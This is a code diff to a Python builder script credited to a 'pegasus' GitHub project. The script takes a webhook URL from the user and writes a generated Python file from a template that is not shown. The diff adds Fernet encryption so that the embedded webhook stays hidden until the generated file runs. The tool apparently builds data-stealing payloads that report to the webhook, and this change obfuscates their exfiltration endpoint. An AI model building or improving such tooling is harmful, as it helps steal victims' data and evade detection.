@@ -2,7 +2,9 @@ import os
 import shutil
 
 import requests
-from colorama import init, Fore, Style
+from colorama import Fore, Style, init
+from cryptography.fernet import Fernet
+
 
 def main():
     print(Fore.BLUE + """
@@ -17,6 +19,13 @@ __________
            github.com/addi00000/pegasus""" + Style.RESET_ALL)
     
     webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
+    
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    token = f.encrypt(bytes(webhook, "utf-8"))
+
+    webhook_enc = f"Fernet({key}).decrypt({token}).decode()"
+    
     
     try:
         r = requests.get(webhook)
@@ -34,7 +43,7 @@ __________
     print(Fore.YELLOW + f"Creating {filename}.py with '{webhook}' as webhook..." + Style.RESET_ALL)
     
     with open(f"{filename}.py", "w", encoding="utf-8") as f:
-        f.write(raw.replace("&WEBHOOK_URL&", webhook))
+        f.write(raw.replace('"&WEBHOOK_URL&"', webhook_enc))
             
     print(Fore.GREEN + "Done!" + Style.RESET_ALL)
     
